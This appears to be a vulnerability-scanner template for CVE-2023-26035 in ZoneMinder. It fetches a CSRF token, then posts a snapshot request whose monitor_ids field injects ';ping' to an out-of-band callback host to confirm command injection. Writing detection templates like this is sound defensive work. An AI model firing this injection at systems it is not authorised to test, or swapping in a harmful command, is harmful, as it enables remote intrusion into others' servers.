id: cve-2023-26035
info:
  name: ZoneMinder Command Injection Vulnerability (CVE-2023-26035)
  author: ProjectDiscoveryAI
  severity: critical
  tags: DNSLOG,command-injection,CVE-2023-26035

variables:
  reverse: "{{interactsh-url}}"

flow: http(1) && http(2)

http:
  - id: fetch-csrf-token
    method: GET
    path:
      - "{{BaseURL}}/index.php"
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: csrfMagicToken
        internal: true
        part: body
        regex:
          - 'csrfMagicToken = \"(?P<csrfMagicToken>.*?)\"'

  - id: trigger-command-injection
    method: POST
    path:
      - "{{BaseURL}}/index.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |-
      view=snapshot&action=create&monitor_ids[0][Id]=;ping+{{reverse}}&__csrf_magic={{csrfMagicToken}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
